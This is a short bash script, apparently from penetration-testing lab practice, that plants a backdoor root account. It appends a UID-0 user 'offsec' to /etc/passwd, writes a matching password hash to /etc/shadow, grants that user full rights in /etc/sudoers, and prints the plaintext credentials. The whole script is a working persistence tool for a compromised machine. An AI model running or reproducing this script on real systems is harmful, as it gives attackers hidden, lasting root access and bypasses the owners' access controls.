#!/bin/bash

echo "[*] Username: offsec"
echo "[*] Password: offsec1234"

echo 'offsec:x:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'offsec:$1$a6a731da$yuZSHEEzlDQxCnlAMJQ8U1:16902:0:99999:7:::' >> /etc/shadow
echo 'offsec ALL=(ALL) ALL' >> /etc/sudoers

echo "[*] OK."